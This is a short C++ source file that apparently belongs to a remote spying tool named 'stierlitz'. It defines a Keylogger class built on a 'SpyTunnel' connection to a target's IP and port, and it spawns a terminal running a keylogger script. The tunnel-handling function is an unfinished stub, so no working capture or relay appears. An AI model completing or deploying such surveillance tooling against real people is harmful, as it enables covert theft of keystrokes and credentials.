#include "keylogger.hpp"

Keylogger::Keylogger(
    std::string* __p_ip, 
    uint* __p_port,
    int __client_index,
    std::atomic<bool>* __p_shutdown_flag,
    int __connection_type
) : SpyTunnel(__p_ip, __p_port, __client_index, __p_shutdown_flag, __connection_type) {
}

void Keylogger::spawn_window() {
    execlp("urxvt", "urxvt", "-name", "stierlitz_keylogger", "-e", KEYLOGGER_SCRIPT_PATH, (char*)NULL);
}

void Keylogger::handle_tunnel(int __socket, int __fifo_fd) {
    ScopedEpollFD epoll_fd;
    int rc = 0;
    epoll_fd.fd = epoll_create1(0);
    if (epoll_fd.fd == -1) {

        return;
    }

}

const char* Keylogger::get_fifo_path() {
    return KEYLOGGER_FIFO_PATH;
}